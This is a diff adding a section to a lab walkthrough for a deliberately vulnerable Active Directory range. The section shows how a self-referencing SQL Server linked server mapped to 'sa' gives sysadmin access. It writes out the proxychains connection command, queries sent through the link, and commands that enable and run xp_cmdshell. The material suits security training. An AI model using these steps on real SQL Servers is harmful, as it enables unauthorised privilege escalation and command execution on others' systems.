@@ -172,6 +172,42 @@ or the lab keeps a live ESC1 that nothing declared.
 > `-CA`, so `NINJA-CA` on this lab. Confirm with `certipy find` rather than
 > assuming it - the name is what `-ca` has to match.
 
+## The SQL host: a linked server that points at itself
+<!-- lab-requires: mssql_linked -->
+
+`sql` is the only SQL Server in nha, so its `mssql_linked` vuln links the instance
+to itself: a linked server named `sql.academy.ninja.lan` with `rpc out` on. The link
+does not self-map. Its login mapping sends every caller across it as the SQL `sa`
+login (whose password is the range's lab password), so any login that can use the
+link runs as sysadmin through it. That is a second road to `sa`, next to the
+`EXECUTE AS` impersonation the same host carries, and it does not depend on that
+grant.
+
+Any `ACADEMY` domain user has a login on the instance. Connect with Windows auth
+through the beacon's SOCKS proxy:
+
+```bash
+proxychains -q mssqlclient.py -windows-auth 'academy.ninja.lan/<user>:<pw>@<sql>'
+```
+
+Then list the link and run through it. Use `EXEC (...) AT [...]` rather than
+`use_link`, which does not accept a dotted link name:
+
+```sql
+enum_links
+EXEC ('SELECT SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')') AT [sql.academy.ninja.lan];
+```
+
+The query returns `sa` and `1`. From there the usual sysadmin steps work over the
+link, for example enabling and calling `xp_cmdshell`:
+
+```sql
+EXEC ('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [sql.academy.ninja.lan];
+EXEC ('EXEC xp_cmdshell ''whoami''') AT [sql.academy.ninja.lan];
+```
+
+`whoami` answers with the SQL Server service account.
+
 ## What this page does not cover
 
 `ninja.hack` also carries `hokage -> Domain Admins` and `hokage -> AdminSDHolder`,
